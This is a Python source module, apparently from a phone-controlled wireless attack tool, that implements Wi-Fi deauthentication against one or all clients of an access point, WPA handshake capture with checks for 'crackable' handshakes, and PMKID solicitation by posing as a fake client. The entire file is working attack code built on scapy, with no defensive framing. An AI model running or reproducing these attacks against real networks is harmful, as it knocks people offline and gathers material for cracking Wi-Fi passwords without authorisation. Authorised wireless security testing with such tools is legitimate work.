"""Active operations: deauth, WPA handshake capture, PMKID capture.

Ported from network-security/{deauth,capture,pmkid}.py with `print` replaced by
an injected `log` callback so progress streams to the phone over the WebSocket.
NOTE: injection on the Broadcom/Nexmon radio is supported but less reliable than
a dedicated Atheros/Realtek adapter — expect occasional misfires.
"""

import time
from contextlib import contextmanager
from threading import Event, Thread

from scapy.all import sendp, sniff, wrpcap
from scapy.layers.dot11 import Dot11AssoResp, Dot11Beacon
from scapy.layers.eap import EAPOL
from scapy.packet import Packet

from app.config import BROADCAST, DEAUTH_BURST, HANDSHAKE_TIMEOUT, PMKID_TIMEOUT
from app.radio import set_channel
from app import dot11


def _noop(*_a, **_k):
    pass


# --- deauth -------------------------------------------------------------------
def send_deauth(iface, bssid, client, channel, bursts=1, log=_noop):
    """Deauth a single client, or BROADCAST to hit every client on the AP."""
    set_channel(channel, iface)
    target = client or BROADCAST
    packets = dot11.build_deauth(bssid, target)
    label = "ALL clients" if target == BROADCAST else target
    for _ in range(bursts):
        log(f"Sending {DEAUTH_BURST} deauth frames to {label} on {bssid}")
        sendp(packets, iface=iface, count=DEAUTH_BURST, inter=0.05, verbose=False)
        time.sleep(0.2)


# --- handshake capture --------------------------------------------------------
@contextmanager
def capture_handshakes(iface, bssid, outfile, handshake_limit=1,
                       timeout=HANDSHAKE_TIMEOUT, log=_noop):
    handshakes = {}
    captured = []
    state = {"got_beacon": False}
    stop = Event()

    def check_done():
        if not state["got_beacon"]:
            return
        crackable = sum(
            1 for m in handshakes.values()
            if (m["M1"] and m["M2"]) or (m["M2"] and m["M3"])
        )
        if crackable >= handshake_limit:
            log(f"SUCCESS: captured {crackable} crackable handshake(s)")
            stop.set()

    def handler(packet: Packet):
        if not state["got_beacon"] and packet.haslayer(Dot11Beacon) and packet.addr3 == bssid:
            captured.append(packet)
            state["got_beacon"] = True
            check_done()
            return
        if not packet.haslayer(EAPOL):
            return

        mac1, mac2 = packet.addr1, packet.addr2
        if bssid not in (mac1, mac2):
            return
        client = mac1 if mac2 == bssid else mac2
        if client == BROADCAST:
            return

        handshakes.setdefault(client, {"M1": False, "M2": False, "M3": False, "M4": False})
        payload = bytes(packet[EAPOL])
        if len(payload) < 7:
            return
        msg = dot11.eapol_message_type(payload, bssid, mac2)
        if handshakes[client][msg]:
            return
        handshakes[client][msg] = True
        captured.append(packet)
        log(f"Caught {msg} from {client}")
        check_done()

    t = Thread(target=sniff, kwargs={
        "iface": iface, "prn": handler,
        "stop_filter": lambda p: stop.is_set(), "store": False,
    }, daemon=True)
    t.start()
    log(f"Listening for handshakes on {bssid}…")

    def wait():
        stop.wait(timeout)

    try:
        yield handshakes, wait
    finally:
        stop.set()
        t.join()
        if len(captured) > 1:
            wrpcap(outfile, captured)
            log(f"Saved capture to {outfile}")
        else:
            log("No handshake captured.")


# --- PMKID capture ------------------------------------------------------------
@contextmanager
def capture_pmkid(iface, bssid, client_mac, outfile, timeout=PMKID_TIMEOUT, log=_noop):
    captured = []
    status = {"beacon": False, "assoc_resp": False, "pmkid": False}
    stop = Event()

    def handler(packet: Packet):
        if not status["beacon"] and packet.haslayer(Dot11Beacon) and packet.addr3 == bssid:
            captured.append(packet)
            status["beacon"] = True
            return
        if not status["assoc_resp"] and packet.haslayer(Dot11AssoResp):
            if packet.addr2 == bssid and packet.addr1 == client_mac:
                captured.append(packet)
                status["assoc_resp"] = True
                log("AP accepted fake client (association response).")
                return
        if packet.haslayer(EAPOL) and packet.addr2 == bssid and packet.addr1 == client_mac:
            payload = bytes(packet[EAPOL])
            if dot11.PMKID_SIGNATURE in payload:
                captured.append(packet)
                status["pmkid"] = True
                log("SUCCESS: caught EAPOL M1 containing PMKID!")
            else:
                log("Caught M1 but no PMKID — target likely not vulnerable.")
            stop.set()

    t = Thread(target=sniff, kwargs={
        "iface": iface, "prn": handler,
        "stop_filter": lambda p: stop.is_set(), "store": False,
    }, daemon=True)
    t.start()
    time.sleep(1)
    log(f"Soliciting PMKID from {bssid}…")

    def wait():
        stop.wait(timeout)

    try:
        yield status, wait
    finally:
        stop.set()
        t.join()
        if status["pmkid"]:
            wrpcap(outfile, captured)
            log(f"Saved PMKID to {outfile}")
        else:
            log("PMKID capture failed or timed out.")


def trigger_pmkid(iface, bssid, client_mac, ssid, channel, log=_noop):
    set_channel(channel, iface)
    log(f"Sending auth request to {ssid}")
    sendp(dot11.build_pmkid_auth(bssid, client_mac), iface=iface, count=1, verbose=False)
    time.sleep(0.1)
    log(f"Sending association request to {ssid}")
    sendp(dot11.build_pmkid_assoc(bssid, client_mac, ssid), iface=iface, count=1, verbose=False)
